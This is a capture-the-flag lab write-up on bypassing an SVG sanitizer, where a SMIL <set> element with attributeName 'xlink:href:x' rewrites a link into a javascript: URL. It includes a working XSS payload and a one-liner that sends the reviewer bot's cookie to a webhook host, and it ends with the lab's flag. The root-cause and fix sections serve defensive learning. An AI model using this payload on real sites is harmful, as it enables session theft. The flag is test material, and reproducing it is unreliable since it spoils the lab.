# Hairline SVG SMIL xlink:href Sanitizer Bypass

## What Is Happening

The [Hairline lab](https://1bb759b773aa.pwnbox-lab.com/) lets an authenticated user upload an HTML or SVG snippet, preview it at `/p/<id>`, and report that preview URL to a reviewer bot.

The preview page fetches the stored snippet from `/raw/<id>` and renders it through `window.setHTML(target, rawText)` from `sanitizer.js`. This build allows SVG animation primitives and blocks animation elements that target navigation attributes by exact `attributeName` string.

The reviewer opens the preview once and auto-activates the first link after 1.2 seconds.

## Why It Happens

The sanitizer drops SVG animation elements when `attributeName` is exactly `href` or `xlink:href`:

```javascript
function removeAttributeIfValueIsHref(el) {
  if (!ANIMATE_ELEMENTS.has(_tagName.call(el).toLowerCase())) return false;
  const value = _getAttribute.call(el, 'attributeName') || '';
  if (value === 'href' || value === 'xlink:href') {
    return true;
  }
  return false;
}
```

That is the pre-patch Chrome Sanitizer behavior described in [Two Bypasses for Chrome's Sanitizer API](https://slcyber.io/research-center/two-bypasses-for-chromes-sanitizer-api/). The bypass uses namespace-parser confusion:

```text
attributeName="xlink:href:x"
```

The sanitizer sees a value that is not exactly `xlink:href`, so the `<set>` element survives. Chrome's SVG attribute parser still treats it as `xlink:href` and rewrites the link after sanitization.

A safe link passes review first:

```html
<a id="foo" xlink:href="https://example.com">...</a>
```

Then SMIL changes it to JavaScript:

```html
<set href="#foo" attributeName="xlink:href:x" to="javascript:eval(atob('...'))"></set>
```

Because the preview bot auto-clicks the first `<a>`, the reviewer executes the rewritten URL without interaction.

## Exact Test

Upload this snippet:

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink">
  <a id="foo" xlink:href="https://example.com">
    <text x="20" y="20">click</text>
  </a>
  <set href="#foo" attributeName="xlink:href:x" to="javascript:eval(atob('[BASE64]'))"></set>
</svg>
```

Generate `[BASE64]` from your exfil primitive:

```bash
python3 -c "import base64; print(base64.b64encode(b\"fetch('https://webhook.site/[UUID]?c='+encodeURIComponent(document.cookie))\").decode())"
```

Report the preview URL:

```bash
curl -sS -X POST "https://1bb759b773aa.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://1bb759b773aa.pwnbox-lab.com/p/[id]"}'
```

## Expected Signal

- Sanitizer keeps the `<set attributeName="xlink:href:x">` element.
- Reviewer auto-clicks the SVG link.
- Webhook receives the reviewer's readable cookie.

## Result Interpretation

Confirmed exploit chain:

```text
SVG snippet upload
-> preview sanitizes snippet in <template>
-> safe xlink:href passes review
-> xlink:href:x animation element survives
-> SMIL rewrites link to javascript:eval(atob(...))
-> reviewer auto-clicks first <a>
-> fetch exfiltrates document.cookie
```

Webhook result:

```text
c=flag=pwnbox{34f9c1a5e8d72b6049af8b1c3d2e7f95}
```

## Root Cause

The sanitizer used exact string matching for `attributeName` instead of SVG-aware parsing. That let SMIL mutate a navigation attribute after sanitization, and reviewer auto-activation provided the execution trigger.

## Impact

- Same-origin JavaScript execution in the reviewer bot's browser.
- Theft of readable cookies from the reviewer session.
- In a real review application, likely reviewer account compromise or unauthorized actions in the preview origin.

## Fix

- Parse `attributeName` with the real SVG attribute parser before allow/deny decisions.
- Reject `xlink:href:x` and similar namespace-confusion forms.
- Strip dangerous `to` / `values` on animation elements, not just the animation tag names.
- Do not auto-activate links during bot review.

## Key Lesson

Blocking `attributeName="xlink:href"` with a string equality check is not enough when the browser's SVG parser interprets a different token as the same navigation attribute. Any sanitizer that allows SMIL must assume href mutation can happen after the walk completes.

## Flag

`pwnbox{34f9c1a5e8d72b6049af8b1c3d2e7f95}`
